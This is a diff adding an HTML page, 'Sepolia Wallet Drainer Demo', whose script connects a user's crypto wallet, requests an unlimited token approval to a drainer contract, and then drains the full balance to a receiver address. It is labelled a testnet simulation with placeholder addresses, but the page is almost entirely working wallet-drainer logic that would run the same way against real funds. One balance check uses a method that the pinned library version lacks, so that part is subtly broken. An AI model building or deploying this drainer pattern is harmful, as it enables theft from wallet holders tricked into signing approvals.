@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sepolia Wallet Drainer Simulation</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.14.1/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <style>
+    body { font-family: sans-serif; padding: 1rem; }
+    button { padding: .5rem 1rem; margin: .5rem; }
+    #status { margin-top: 1rem; }
+  </style>
+</head>
+<body>
+  <h1>🔒 Sepolia Wallet Drainer Demo</h1>
+  <p>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="approveBtn" disabled>Approve Tokens</button>
+    <button id="drainBtn"   disabled>Drain Tokens</button>
+  </p>
+  <div id="status">Not connected</div>
+
+  <script>
+  (async function(){
+    // ▶️ CONFIGURATION (CHANGE THESE!)
+    const SEPOLIA_RPC = 'https://sepolia.infura.io/v3/YOUR_INFURA_PROJECT_ID';
+    const TOKEN_ADDRESS = '0xYourDummyTokenAddress';       // Deployed Sepolia ERC-20
+    const DRAINER_ADDRESS = '0xYourDrainerContractAddress';// Sepolia Drainer contract
+    const RECEIVER_ADDRESS = '0xYourReceiverSepoliaAddress';// Where tokens end up
+
+    // ERC-20 & Drainer ABIs (minimal)
+    const ERC20_ABI = [
+      'function approve(address spender, uint256 amount) public returns(bool)',
+      'function allowance(address owner, address spender) public view returns(uint256)',
+      'function balanceOf(address owner) public view returns(uint256)'
+    ];
+    const DRAINER_ABI = [
+      'function drain(address tokenAddr, uint256 amount) external'
+    ];
+
+    // UI Elements
+    const connectBtn = document.getElementById('connectBtn');
+    const approveBtn = document.getElementById('approveBtn');
+    const drainBtn   = document.getElementById('drainBtn');
+    const statusDiv  = document.getElementById('status');
+
+    let provider, signer, walletAddress;
+
+    // 1) CONNECT WALLET (MetaMask or WalletConnect)
+    connectBtn.addEventListener('click', async () => {
+      // If MetaMask
+      if (window.ethereum) {
+        provider = new ethers.BrowserProvider(window.ethereum);
+      } else {
+        // Fallback to WalletConnect v1
+        const wcProvider = new window.WalletConnectProvider.default({
+          rpc: { 11155111: SEPOLIA_RPC },
+          chainId: 11155111
+        });
+        await wcProvider.enable();
+        provider = new ethers.BrowserProvider(wcProvider);
+      }
+      signer = await provider.getSigner();
+      walletAddress = await signer.getAddress();
+      statusDiv.textContent = `Connected: ${walletAddress}`;
+      approveBtn.disabled = false;
+    });
+
+    // 2) APPROVE TOKENS
+    approveBtn.addEventListener('click', async () => {
+      statusDiv.textContent = 'Sending approval…';
+      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
+      // Approve unlimited (max-uint256)
+      const max = ethers.MaxUint256;
+      const tx = await token.approve(DRAINER_ADDRESS, max);
+      statusDiv.textContent = `Approval tx sent: ${tx.hash}`;
+      await tx.wait();
+      statusDiv.textContent = 'Approved! Ready to drain.';
+      drainBtn.disabled = false;
+    });
+
+    // 3) DRAIN TOKENS
+    drainBtn.addEventListener('click', async () => {
+      statusDiv.textContent = 'Draining tokens…';
+      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
+      const bal   = await token.balanceOf(walletAddress);
+      if (bal.isZero()) {
+        statusDiv.textContent = 'No tokens to drain!';
+        return;
+      }
+      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);
+      const tx = await drainer.drain(TOKEN_ADDRESS, bal);
+      statusDiv.textContent = `Drain tx sent: ${tx.hash}`;
+      await tx.wait();
+      statusDiv.textContent = `Drained ${ethers.formatUnits(bal, 18)} tokens to ${RECEIVER_ADDRESS}`;
+    });
+  })();
+  </script>
+</body>
+</html>
